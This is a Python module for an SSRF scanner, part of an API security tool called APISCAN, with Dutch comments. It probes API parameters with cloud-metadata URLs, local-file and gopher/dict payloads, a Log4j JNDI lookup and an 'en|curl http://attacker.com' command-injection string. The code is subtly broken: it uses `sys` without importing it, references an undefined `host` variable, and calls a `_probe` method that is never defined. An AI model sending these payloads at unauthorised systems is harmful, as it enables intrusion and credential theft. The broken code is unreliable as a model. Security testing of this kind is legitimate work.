##################################
# APISCAN - API Security Scanner #
# Licensed under the MIT License #
# Author: Perry Mertens, 2025    #
##################################
from __future__ import annotations

import json
import random
import threading
import time
import socket
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import quote_plus, urljoin

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from report_utils import ReportGenerator  # door Perry samengevoegde helper
# Schakel waarschuwing uit voor self-signed TLS tijdens tests
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)  # type: ignore

Endpoint = Dict[str, Any]
Issue = Dict[str, Any]

def _headers_to_list(hdrs):
    """
    urllib3.HTTPHeaderDict -> alle Set-Cookie los
    """
    if hasattr(hdrs, "getlist"):
        return [(k, v) for k in hdrs for v in hdrs.getlist(k)]
    return list(hdrs.items())


def _safe_body(resp: requests.Response, limit: int = 2048) -> str:
    """Return a text safe slice of the response body (bytes - utf-8)."""
    if not resp:
        return ""
    if resp.text:                        
        return resp.text[:limit]
    try:                                   
        return resp.content[:limit].decode("utf-8", errors="replace")
    except Exception:
        return ""



class SSRFAuditor:
    """Voert uitsluitend **API-8 - Server-Side Request Forgery** detectie uit."""

    # --- configuratie --------------------------------------------------
    PAYLOADS = [
        # Cloud metadata services
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",  # AliCloud
        # Loopback varianten
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://2130706433/",  # 127.0.0.1 in int-vorm
        "http://127.0.0.1.nip.io/",
        # Bestands- en protocol-abuse
        "file:///etc/passwd",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "gopher://127.0.0.1:11211/_stats\r\nquit\r\n",
        # Out-of-band-/ OAST
        "http://burpcollaborator.net/",
        "http://127.0.0.1:80/",
        "http://localhost:22/",
        "http://169.254.169.254/",  # Zonder specifiek path
        "dict://127.0.0.1:6379/info",  # Redis
        "http://localtest.me/",  # Resolves to 127.0.0.1
        "http://customer.app.localhost.127.0.0.1.nip.io/",
    ]

    LANG_PAYLOADS = [
        "http://127.0.0.1/%0D%0AConnection:%20keep-alive",  # HTTP header injection
        "en;http://169.254.169.254",  # Parameter pollution
        "../../../../etc/passwd",     # Path traversal
        "${jndi:ldap://attacker.com}", # Log4j
        "en|curl http://attacker.com", # Command injection
    ]

    MAX_CONCURRENCY = 10
    DEFAULT_TIMEOUT = 4
    DEFAULT_RPS = 8
    BLIND_THRESHOLD = 4  # seconden

    # -------------------------------------------------------------------
    def __init__(
        self,
        base_url: str,
        session: Optional[requests.Session] = None,
        *,
        concurrency: int = MAX_CONCURRENCY,
        rps: int = DEFAULT_RPS,
        timeout: int = DEFAULT_TIMEOUT,
        verify_tls: bool = False,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.sess = session or requests.Session()
        self.sess.verify = verify_tls
        self.concurrency = concurrency
        self.rps = rps
        self.timeout = timeout

        self._last_ts = 0.0
        self._lock = threading.Lock()
        self._issues: List[Issue] = []
        self._tested_payloads: set[tuple[str, str]] = set()

    # ------------------------------------------------------------------
    @staticmethod
    def endpoints_from_swagger(swagger_path: str | Path, *, default_base: str = "") -> List[Endpoint]:
        """Parse (Open)API spec and return a list of endpoint dicts **including a full `url` key**.

        apiscan.py expects each entry to have:
            {"method": "GET", "path": "/pets", "url": "https://api.example.com/pets", ...}
        """
        spec = json.loads(Path(swagger_path).read_text(encoding="utf-8"))
        server_decl = spec.get("servers", [{}])
        server = server_decl[0].get("url", "") if server_decl else ""
        base = server or default_base

        endpoints: List[Endpoint] = []
        for path, item in spec.get("paths", {}).items():
            for method in item.keys():
                full_url = urljoin(base, path.lstrip("/"))
                endpoints.append({
                    "method": method.upper(),
                    "path": path,
                    "base": base,
                    "url": full_url,
                })
        return endpoints

    # ------------------------------------------------------------------
    def test_endpoints(self, endpoints: List[Endpoint]) -> List[Issue]:
        """Scan alle endpoints en retourneer lijst met findings."""
        print(f"[+] Start SSRF scan op {len(endpoints)} endpoints...")
        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
            pool.map(self._scan_endpoint, endpoints)
        print("[+] SSRF scan afgerond.")
        return self._issues

    # ------------------------------------------------------------------
    # interne helpers
    def _scan_endpoint(self, ep: Endpoint) -> None:
        
        print(f"[*] SSRF scan: {ep['method']} {ep['path']}") 
        base = ep.get("base") or self.base_url
        url_base = urljoin(base, ep["path"].lstrip("/"))
        # check on localhost
        host = urlparse(url_base).hostname
        if host in {"127.0.0.1", "localhost", "::1"}:
            print(f"[ABORT] Scanning localhost target ({host}). Stopping all scanning.")
            sys.exit(1)
        
        print(f"[*] SSRF scan: {ep['method']} {ep['path']}")
        method = ep["method"]
        # Parameter detectie optimalisatie
        parameters = ep.get("parameters", [])
        param_names = {p["name"] for p in parameters if p["in"] in ["query", "header", "path"]}
        
        # Combineer met standaard parameters (zonder duplicates)
        COMMON_PARAMS = {"url", "endpoint", "host", "server", "target", 
                        "lang", "language", "locale", "v", "version", "api"}
        all_params = param_names.union(COMMON_PARAMS)
        
        # Specifieke payloads voor taal/version parameters
        LANG_PAYLOADS = [
            "http://127.0.0.1/%0D%0AConnection:%20keep-alive",
            "en;http://169.254.169.254",
            "../../../../etc/passwd",
            "${jndi:ldap://attacker.com}",
            "en|curl http://attacker.com",
        ]
        
        # E-n gecombineerde scanlus voor effici-ntie
        for param in all_params:
            # Standaard payloads voor alle parameters
            for payload in random.sample(self.PAYLOADS, len(self.PAYLOADS)):
                self._probe_params(ep, url_base, method, param, payload)
            
            # Extra payloads voor taal/version parameters
            if param in {"lang", "language", "locale", "v", "version"}:
                for payload in LANG_PAYLOADS:
                    self._probe_params(ep, url_base, method, param, payload)
    
# --------------- PROBE ---------------------------------------
    def _probe_params(
        self,
        ep: Endpoint,
        base_url: str,
        method: str,
        param: str,
        payload: str,
    ) -> None:
        """
        Injects an SSRF payload into a parameter using multiple injection vectors.
        - Aborts the scan if the target host is localhost
        - Warns when a payload targets localhost
        - Skips payloads that are not in the allowed target list
        - Avoids duplicate tests per (param, payload) pair
        """

        # Extract hostname from the target URL
        target_host = urlparse(base_url).hostname or ""

        # Abort the scan immediately if the target is localhost
        if host in {"127.0.0.1", "localhost", "::1"}:
            print(f"[SKIP] Localhost target ({host}) - skipping endpoint.")
            return
        
        # Define allowed SSRF destinations
        valid_targets = {"example.com", "burpcollaborator.net", "attacker.site"}
        loopback_hosts = {"localhost", "127.0.0.1", "::1"}

        # Warn if the payload points to localhost
        if any(lp in payload for lp in loopback_hosts):
            print(f"[WARNING] Payload targets localhost: {payload}")

        # Skip payloads that do not target a valid destination
        if not any(target in payload for target in valid_targets.union(loopback_hosts)):
            return

        # Deduplicate per (param, payload)
        key = (param, payload)
        if key in self._tested_payloads:
            return
        self._tested_payloads.add(key)

        # Injection vector 1: Query string
        qs_url = f"{base_url}?{param}={quote_plus(payload)}"
        self._probe(ep, qs_url, method, payload=payload, param=param)

        # Injection vector 2: JSON body
        if method.upper() in {"POST", "PUT", "PATCH"}:
            self._probe(
                ep, base_url, method,
                json_body={param: payload},
                payload=payload,
                param=param,
            )

        # Injection vector 3: Form body
        if method.upper() in {"POST", "PUT", "PATCH"}:
            self._probe(
                ep, base_url, method,
                data={param: payload},
                payload=payload,
                param=param,
            )

        # Injection vector 4: Header
        self._probe(
            ep, base_url, method,
            headers={param: payload},
            payload=payload,
            param=param,
        )

        # Injection vector 5: Path parameter
        if f"{{{param}}}" in base_url:
            path_url = base_url.replace(f"{{{param}}}", quote_plus(payload))
            self._probe(ep, path_url, method, payload=payload, param=param)

            
# --------------- REFECTION ----------------------------------

    def _detect_reflection(self, body: str, payload: str, param: str = None, host: str = None) -> bool:
        """
        Detecteert of de payload of gerelateerde patronen gereflecteerd worden in de response.
        
        Args:
            body: Response body (lowercase)
            payload: Oorspronkelijke payload
            param: Parameter naam waarin ge-njecteerd is
            host: Host uit de payload
            
        Returns:
            bool: True als reflectie gedetecteerd wordt
        """
        payload_lc = payload.lower()
        
        # Directe payload reflectie
        if payload_lc in body:
            return True
            
        # Host reflectie (zonder protocol)
        if host and host in body:
            return True
            
        # Parameter-specifieke patronen
        if param:
            param_lc = param.lower()
            patterns = [
                f"{param_lc}=",               # Parameter in response
                f"invalid {param_lc}",         # Validatie errors
                f"unknown {param_lc}",
                f"unsupported {param_lc}",
                f"missing {param_lc}",
                f"{param_lc} invalid",
                f"{param_lc} required",
                f"{param_lc} must be",        # Validatie messages
                f"invalid value for {param_lc}"
            ]
            if any(p in body for p in patterns):
                return True
        
        # Generieke SSRF indicatoren
        ssrf_indicators = [
            "localhost",
            "127.0.0.1",
            "169.254.169.254",
            "metadata.google.internal",
            "internal server error",
            "forbidden",
            "not allowed"
        ]
        return any(indicator in body for indicator in ssrf_indicators)


   # -- inside class SSRFAuditor -----------------------------------------
    
              
  #-------------------------------------------------------------------------
    def _record_issue(
        self, 
        ep: Endpoint, 
        payload: str, 
        status: int, 
        latency: float, 
        note: str, 
        param: str = None,
        request_headers: Optional[dict] = None,
        response_headers: Optional[dict] = None,
        response_body: Optional[str] = None,
        request_cookies: Optional[dict] = None,
        response_cookies: Optional[dict] = None,
    ) -> None:
        issue = {
            "endpoint": f"{ep['method']} {ep['path']}",
            "parameter": param or "N/A",
            "payload": payload,
            "status_code": status,
            "latency": round(latency, 2),
            "description": note,
            "severity": "High" if "Reflected" in note else "Medium",
            "timestamp": datetime.utcnow().isoformat(),
            "request_headers": request_headers or {},
            "response_headers": response_headers or {},
            "request_body": None,
            "response_body": response_body or "",
            "request_cookies": request_cookies or {},
            "response_cookies": response_cookies or {},
        }
        
        with self._lock:
            # Deduplicatie op endpoint + parameter + payload
            key = (issue["endpoint"], issue["parameter"], issue["payload"])
            if not any((i["endpoint"], i["parameter"], i["payload"]) == key 
                for i in self._issues):
                print(f"[!] SSRF finding: {issue['description']} on {issue['endpoint']} (param: {param})")
                self._issues.append(issue)
        
        # ------------------------------------------------------------------
    # rapportage-helpers
    def _filtered_findings(self) -> List[Issue]:
        """Return current unique findings (dedupe al in _record_issue)."""
        return self._issues

    def generate_report(self, fmt: str = "html") -> str:
        issues = self._filtered_findings()
        if not issues:
            issues.append({
                "endpoint": "-",
                "method": "INFO",
                "description": "No SSRF findings detected",
                "severity": "Info",
                "status_code": 200,
                "timestamp": datetime.utcnow().isoformat(),
                "request_headers": {},
                "response_headers": {},
                "request_body": None,
                "response_body": "",
            })
        gen = ReportGenerator(issues, scanner="SSRF (API8)", base_url=self.base_url)
        return gen.generate_html() if fmt == "html" else gen.generate_markdown()

    def save_report(self, path: str, fmt: str = "html") -> None:
        Path(path).write_text(self.generate_report(fmt), encoding="utf-8")
